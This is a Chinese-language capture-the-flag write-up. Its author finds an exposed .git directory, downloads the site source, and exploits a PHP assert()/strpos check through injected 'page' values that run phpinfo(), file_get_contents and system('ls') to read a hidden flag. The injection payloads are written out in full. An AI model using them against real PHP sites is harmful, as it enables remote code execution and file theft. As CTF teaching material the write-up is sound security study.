## 题目描述

无

## 思路

打开题目，随便点点

![20190829215609.png](https://raw.githubusercontent.com/handbye/images/master/20190829215609.png)

在about页面发现了两个重要信息PHP和git

![20190829215650.png](https://raw.githubusercontent.com/handbye/images/master/20190829215650.png)

这时候我想到是否网站存在git可下载源码的问题，上扫描器扫一下。

![20190829221954.png](https://raw.githubusercontent.com/handbye/images/master/20190829221954.png)

发现了`.git`目录,存在此目录可下载网站源码。利用工具：[https://github.com/lijiejie/GitHack](https://github.com/lijiejie/GitHack)

![20190829222546.png](https://raw.githubusercontent.com/handbye/images/master/20190829222546.png)

源码已下载完毕,打开发现有flag.php,但是内容是空的。

![20190829222901.png](https://raw.githubusercontent.com/handbye/images/master/20190829222901.png)

而且在网页源代码中也发现了一条注释信息：

![20190829222945.png](https://raw.githubusercontent.com/handbye/images/master/20190829222945.png)

将URl中的page参数改为falg返回空页面

![20190829223047.png](https://raw.githubusercontent.com/handbye/images/master/20190829223047.png)

这条路走不通了，只有看下源码中的index.php，发现了以下这段代码。

![20190829223240.png](https://raw.githubusercontent.com/handbye/images/master/20190829223240.png)

简单审计下：

`$file`变量接收输入的`$page`并且拼接`.php`

`assert`函数：

> `assert ( mixed $assertion [, string $description ] ) : bool `
>
> assert() 会检查指定的 assertion 并在结果为 FALSE 时采取适当的行动

`strpos`函数

strpos() 函数查找字符串在另一字符串中第一次出现的位置（区分大小写。

语法：`strpos(string,find,start)`

![20190829225328.png](https://raw.githubusercontent.com/handbye/images/master/20190829225328.png)

代码中不允许输入的字符中包含连续的两个点，否则就返回错误

这段代码中只用黑名单过滤了连个点，我们可以想办法绕过。

比如传入`page=aa') or phpinfo();#`,如此代码就变为了`$file=templates/aa') or phpinfo();#.php`

然后源码中的判断变成了下面这样：

```php
assert("strpos('templates/aa') or phpinfo();#.php', '..') === false") or die("Detected hacking attempt!");
assert("file_exists('templates/aa') or phpinfo();#.php')") or die("That file doesn't exist!");
```

如此一来就会执行phpinfo()

![20190829231400.png](https://raw.githubusercontent.com/handbye/images/master/20190829231400.png)

传入'page=aa') or print_r(file_get_contents('templates/flag.php'));#'即可得到flag.php的内容

但是尝试无果，可能系统仅用了`file_get_contents`函数（这里更正下，并非禁用了此函数，而是要查看网页源码才能看到Flag,Flag是注释过的）

只好换一种方法尝试，测试下能否执行系统函数`system()`

传入`'.system("ls").'`,如此代码就变为了`$file=templates/'.system("ls).'`

然后源码中的判断变成了下面这样：

```php
assert("strpos('templates/'.system("ls").'.php', '..') === false") or die("Detected hacking attempt!");
assert("file_exists('templates/'.system("ls").'.php')") or die("That file doesn't exist!");
```

如此一来就会执行`system("ls")`

![20190829233140.png](https://raw.githubusercontent.com/handbye/images/master/20190829233140.png)

![20190829233317.png](https://raw.githubusercontent.com/handbye/images/master/20190829233317.png)

![20190829234823.png](https://raw.githubusercontent.com/handbye/images/master/20190829234823.png)

使用cat查看flag.php的内容时一定要查看网页源码才能获取Flag,Flag是加了注释的，这里是真的坑啊。

![20190829234938.png](https://raw.githubusercontent.com/handbye/images/master/20190829234938.png)
